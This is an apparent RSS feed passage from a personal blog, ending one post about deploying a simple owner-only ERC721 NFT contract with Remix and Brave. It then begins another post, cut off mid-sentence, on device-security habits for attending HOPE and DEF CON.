&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; safeMint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; string&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt; memory&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; uri&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt; public&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; onlyOwner&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; {&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;        uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; tokenId &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; _tokenIdCounter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;current&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;();&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;        _tokenIdCounter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;increment&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;();&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;        _safeMint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;        _setTokenURI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; uri&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0&quot;&gt;    // The following functions are overrides required by Solidity.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; _beforeTokenTransfer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; batchSize&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        internal&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; ERC721Enumerable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    {&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;        super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;_beforeTokenTransfer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; batchSize&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; _burn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt; internal&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt; override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; ERC721URIStorage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; {&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;        super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;_burn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; tokenURI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;uint256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        public&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        view&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; ERC721URIStorage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;        returns&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;string&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt; memory&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    {&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;        return&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;tokenURI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;tokenId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;    function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; supportsInterface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;bytes4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; interfaceId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        public&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        view&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;        override&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt; ERC721Enumerable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;        returns&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;bool&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    {&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;        return&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; super&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;supportsInterface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;interfaceId&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Since I’m &lt;em&gt;not&lt;/em&gt; producing NFTs for public consumption, I skipped the parts of the Alchemy walk-through where this code was modified to cap the number of NFTs and make it possible for addresses other than the contract’s owner to call it.&lt;/p&gt;
&lt;p&gt;Up until now, Safari, Light Wallet, and the iPad Pro work swimmingly. Unfortunately, the web-based Ethereum Remix IDE, which is how we’ll deploy the smart contract code above, does &lt;em&gt;not&lt;/em&gt; play well with this setup.  The issue might be Safari, or it might be Light Wallet; I’m not sure, but the behavior of Remix on both iPadOS and macOS is identical: You can compile the smart contract code (though lockdown mode must be disabled for the site), but attempting to deploy the code always results in a mysterious “Transaction Failed” error message.&lt;/p&gt;
&lt;p&gt;Eventually I installed &lt;a href=&quot;https://brave.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Brave&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; on my MacBook for the sole purpose of being able to deploy the smart contract code. &lt;a href=&quot;https://brave.com/wallet/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Brave’s built-in wallet&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; works perfectly with Remix.&lt;/p&gt;
&lt;p&gt;You’ll want to note down the version of Solidity you used to compile the smart contract, the wallet address you used to deploy it, and the smart contract’s address on the blockchain. With this information, you can always return to remix, recompile the smart contract code, connect the controlling wallet, and then reconnect to the smart contract to mint additional NFTs.&lt;/p&gt;
&lt;p&gt;Once the contract was deployed, the only other stumbling block I ran into was that it’s not obvious that the safeMint function requires &lt;em&gt;two&lt;/em&gt; arguments — the first is the address to send the NFT to, and the second is the metadata &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/uniform-resource-locators&quot;&gt;URI&lt;/a&gt;. You can use the chevron next to the function name in Remix to expand both arguments into separate fields, which makes it more obvious how to enter in the necessary information.&lt;/p&gt;
&lt;p&gt;The tokenURI function is also useful: When called with the token ID (an incrementing integer, starting at 0), it will return the metadata &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/uniform-resource-locators&quot;&gt;URI&lt;/a&gt; for the corresponding NFT.&lt;/p&gt;
&lt;p&gt;The minted NFTs took a looooong time to show up in &lt;a href=&quot;https://metamask.io&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;MetaMask&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, but they did show up in &lt;a href=&quot;https://opensea.io&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;OpenSea&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; pretty much immediately. You can use the OpenSea interface to transfer the minted NFTs to other accounts.&lt;/p&gt;
&lt;p&gt;It’s worth noting here that viewing and transferring any NFTs you mint works fine on Safari + Light Wallet. It’s &lt;em&gt;only&lt;/em&gt; the Remix IDE that doesn’t like that setup, and in fact it’s &lt;em&gt;only&lt;/em&gt; deploying and interacting with your contract that’s broken. Everything else in this process can be done using iPadOS. Hopefully this situation will improve over time.&lt;/p&gt;</description>
    <pubDate>Sun, 27 Nov 2022 00:00:00 GMT</pubDate>
  </item><item>
    <title>Notes from HOPE and DEF CON</title>
    <link>https://cardboard-iguana.com/grimoire/commentaries/2022-08-15-notes-from-hope-and-def-con</link>
    <guid>https://cardboard-iguana.com/grimoire/commentaries/2022-08-15-notes-from-hope-and-def-con</guid>
    <description>&lt;p&gt;Now that both &lt;a href=&quot;https://xiv.hope.net/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;HOPE&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://defcon.org/html/defcon-30/dc-30-index.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;DEF CON&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; are behind me, I want to summarize some of my initial thoughts. This is not a “what did I learn about hacking” post, but rather musings about &lt;em&gt;attending&lt;/em&gt; these events.&lt;/p&gt;
&lt;h2 id=&quot;device-security&quot;&gt;Device security&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#device-security&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The internet is awash with advice to only bring burner phones/laptops to DEF CON (or hacker conferences in general), to assume any credit card you use while attending (or even being near) DEF CON is compromised, etc.&lt;/p&gt;
&lt;p&gt;After much consideration, I’ve come to believe that much of this “advice” is ill-conceived, and shows either the advice-giver’s poor risk modeling abilities or inflated sense of their own importance. &lt;a href=&quot;https://blog.erratasec.com/2019/08/securing-devices-for-defcon.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Rob Graham’s advice&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is much better: Encrypt your stuff and be careful about &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/wifi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/wifi&quot;&gt;Wi-Fi&lt;/a&gt; and Bluetooth, and you’ll almost certainly be fine.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Assuming that you’re using up-to-date devices&lt;/em&gt;, the main risks of going to a hacker conference are the same as any sort of travel: Theft, assault, abuse by the local authorities. I’m not the kind of person who needs to worry as much about the second two of these, so theft is my main concern. Here’s my general travel setup, which I think is also pretty solid for hacker conferences:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I &lt;em&gt;don’t&lt;/em&gt; take my regular computer with me. I travel with a recent &lt;a href=&quot;https://www.apple.com/ipad-pro/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;iPad Pro&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and &lt;a href=&quot;https://www.apple.com/iphone/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;iPhone&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, and also bring along a &lt;a href=&quot;https://www.raspberrypi.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Raspberry Pi&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (currently a 4B running &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/linux&quot;&gt;Kali Linux&lt;/a&gt; — I have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/how-to-use-a-raspberry-pi-4b-as-hacking-accessory&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/how-to-use-a-raspberry-pi-4b-as-hacking-accessory&quot;&gt;a guide covering how to set that up&lt;/a&gt; 